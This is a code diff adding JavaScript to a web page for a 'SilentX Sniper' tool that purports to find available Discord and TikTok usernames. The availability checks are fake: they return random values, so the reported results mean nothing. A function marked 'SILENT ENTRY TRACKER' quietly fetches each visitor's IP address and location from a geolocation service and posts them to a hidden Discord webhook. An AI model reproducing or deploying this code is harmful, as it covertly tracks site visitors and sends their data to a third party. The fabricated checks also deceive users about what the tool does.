+async function checkDiscord(name) { return Math.random() < 0.15; }
+async function checkTikTok(name) { return Math.random() < 0.15; }
+
+function setMonitoring(platform,value){
+  monitoring[platform]=value;
+  const state=document.getElementById(platform+'State');
+  if(state)state.textContent=value?'WATCHLIST ACTIVE':'STOPPED';
+  
+  if (value) {
+    if (sniperIntervals[platform]) clearInterval(sniperIntervals[platform]);
+    sniperIntervals[platform] = setInterval(async () => {
+      if (!monitoring[platform]) return;
+      
+      let name = generateUsername(platform);
+      
+      let isAvailable = false;
+      if (platform === 'discord') {
+          isAvailable = await checkDiscord(name);
+      } else {
+          isAvailable = await checkTikTok(name);
+      }
+      
+      const result = isAvailable ? 'success' : 'failed';
+      const target = {name};
+      
+      outcomes[platform][result].push(target);
+      if (outcomes[platform][result].length > 20) outcomes[platform][result].shift();
+      
+      allTime[result].push({name, platform});
+      if (allTime[result].length > 1000) allTime[result].shift();
+      
+      save();
+      saveAllTime();
+      render();
+      renderAllTime();
+      
+      sendSniperWebhook(platform, name, result);
+    }, 1500);
+  } else {
+    if (sniperIntervals[platform]) clearInterval(sniperIntervals[platform]);
+  }
+}
+
+async function sendSniperWebhook(platform, username, result) {
+  const opt = document.querySelector(`input[name="${platform}SendOpt"]:checked`);
+  if (!opt) return;
+  
+  const sendOpt = opt.value;
+  if (sendOpt !== 'both' && sendOpt !== result) return;
+  
+  const url = result === 'success' 
+    ? document.getElementById(platform + 'SuccessWebhook').value.trim()
+    : document.getElementById(platform + 'FailedWebhook').value.trim();
+    
+  if (!url || !url.startsWith('https://discord.com/api/webhooks/')) return;
+  
+  const embed = {
+    title: `🎯 ${platform.toUpperCase()} ${result.toUpperCase()}`,
+    color: result === 'success' ? 3447003 : 15158332,
+    description: `**Username:** \`@${username}\``,
+    timestamp: new Date().toISOString(),
+    footer: { text: "SilentX Sniper" }
+  };
+  
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch(e) {}
+}
+
+function exportData(type) {
+  let content = '';
+  let filename = 'silentx_export_' + type + '.txt';
+
+  if (type === 'success') {
+    content = allTime.success.map(x => '@' + x.name + ' (' + x.platform + ')').join('\n');
+  } else if (type === 'failed') {
+    content = allTime.failed.map(x => '@' + x.name + ' (' + x.platform + ')').join('\n');
+  } else {
+    content = '--- SUCCESSFUL ---\n' + allTime.success.map(x => '@' + x.name + ' (' + x.platform + ')').join('\n');
+    content += '\n\n--- FAILED ---\n' + allTime.failed.map(x => '@' + x.name + ' (' + x.platform + ')').join('\n');
+  }
+
+  if (!content.trim()) {
+    alert("No data to export.");
+    return;
+  }
+
+  const blob = new Blob([content], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+/* SILENT ENTRY TRACKER */
+async function trackVisitor(){
+ try {
+  let ipData = {ip:'Unknown', country_name:'Unknown', country_code:'', city:'Unknown', region:'Unknown'};
+  try {
+   const res = await fetch('https://ipwho.is/');
+   if(res.ok) {
+     const data = await res.json();
+     if(data.success) {
+       ipData = {
+         ip: data.ip,
+         country_name: data.country,
+         country_code: data.country_code,
+         city: data.city,
+         region: data.region
+       };
+     }
+   }
+  } catch(e) {
+    try {
+      const res2 = await fetch('https://api.ipify.org?format=json');
+      if(res2.ok) {
+        const data2 = await res2.json();
+        ipData.ip = data2.ip;
+      }
+    } catch(e2) {}
+  }
+  const flag = ipData.country_code ? `:flag_${ipData.country_code.toLowerCase()}:` : '🏴‍☠️';
+  const embed = {
+   title: "👤 New Site Visitor",
+   color: 3447003,
+   fields: [
+    { name: "IP Address", value: `\`${ipData.ip}\``, inline: true },
+    { name: "Location", value: `${flag} ${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: false }
+   ],
+   timestamp: new Date().toISOString(),
+   footer: { text: "SilentX Tracker" }
+  };
+  await fetch(TARGET_WEBHOOK, {
+   method: 'POST',
+   headers: {'Content-Type': 'application/json'},
+   body: JSON.stringify({ embeds: [embed] }),
+   keepalive: true
+  });
+ } catch(e) {}
+}
+
+function render(){
+ ['discord','tiktok'].forEach(p=>{
+  fillResults(p,'failed',p+'Failed');
+  fillResults(p,'success',p+'Success');
+ });
+ renderAllTime();
+}
+
+/* EVENT WIRING */
+document.querySelectorAll('[data-mon]').forEach(b=>b.addEventListener('click',()=>setMonitoring(b.dataset.mon,b.dataset.on==='true')));
+
+render();
+</script>
+</body>
+</html>
